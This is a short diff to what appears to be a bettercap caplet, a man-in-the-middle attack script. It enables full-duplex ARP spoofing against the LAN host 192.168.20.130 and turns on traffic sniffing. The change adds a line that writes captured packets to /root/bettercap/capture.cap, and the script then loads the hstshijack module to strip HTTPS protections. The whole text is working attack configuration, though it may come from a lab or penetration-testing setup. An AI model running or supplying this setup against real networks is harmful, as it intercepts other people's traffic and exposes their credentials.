@@ -8,6 +8,7 @@ set arp.spoof fullduplex targets 192.168.20.130
 arp.spoof on
 
 set net.sniff.local true
+set net.sniff.output /root/bettercap/capture.cap
 net.sniff on
 
 hstshijack/hstshijack
